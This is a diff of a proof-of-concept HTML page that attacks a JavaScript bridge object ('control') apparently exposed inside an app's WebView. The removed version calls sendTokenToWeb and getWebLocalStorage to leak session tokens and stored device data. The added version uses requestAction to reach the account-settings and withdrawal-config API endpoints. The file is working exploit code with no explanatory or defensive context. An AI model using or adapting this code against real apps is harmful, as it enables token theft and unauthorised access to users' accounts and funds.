@@ -1,16 +1,20 @@
 <!DOCTYPE html><html><head><title>PoC</title></head>
 <body>
-<h2>PoC v13 logged-in leak</h2>
+<h2>PoC v14 requestAction probe</h2>
 <pre id="out">running...</pre>
 <script>
-function log(s){var e=document.getElementById('out');e.textContent += "\n" + s; }
-function mkcb(name){ var fn = "__cb_"+name; window[fn] = function(d){ log("LEAK["+name+"] type="+(typeof d)); try{ log("LEAK["+name+"] data="+JSON.stringify(d)); }catch(_){ log("LEAK["+name+"] raw="+String(d)); } }; return fn; }
+function log(s){document.getElementById('out').textContent += "\n" + s;}
+function mkcb(name){ var fn = "__cb_"+name; window[fn]=function(d){ log("CB["+name+"]="+(typeof d=="string"?d:JSON.stringify(d))); }; return fn; }
 setTimeout(function(){
   if (!window.control) { log("NO control"); return; }
-  log("control OK, keys=" + Object.keys(control).length);
-  try { control.sendTokenToWeb(mkcb("token")); log("called sendTokenToWeb"); } catch(e){ log("ERR sTTW:"+e); }
-  try { control.getWebLocalStorage(mkcb("wls"), "device"); log("called getWebLocalStorage"); } catch(e){ log("ERR gwls:"+e); }
-  try { control.requestAction("/api/v1/poc/probe", JSON.stringify({a:1}), mkcb("ra")); log("called requestAction"); } catch(e){ log("ERR ra:"+e); }
-}, 800);
+  var rid = mkcb("ra");
+  var req = { path: "/v1/user/account/settings", params: {}, requestId: rid };
+  try { control.requestAction(JSON.stringify(req)); log("requestAction sent: "+JSON.stringify(req)); } catch(e){ log("ERR ra: "+e); }
+  setTimeout(function(){
+    var rid2 = mkcb("ra2");
+    var req2 = { path: "/v1/user/withdraw/config", params: {}, requestId: rid2 };
+    try { control.requestAction(JSON.stringify(req2)); log("requestAction2 sent path="+req2.path+" cb="+rid2); } catch(e){ log("ERR ra2: "+e); }
+  }, 2500);
+}, 600);
 </script>
 </body></html>
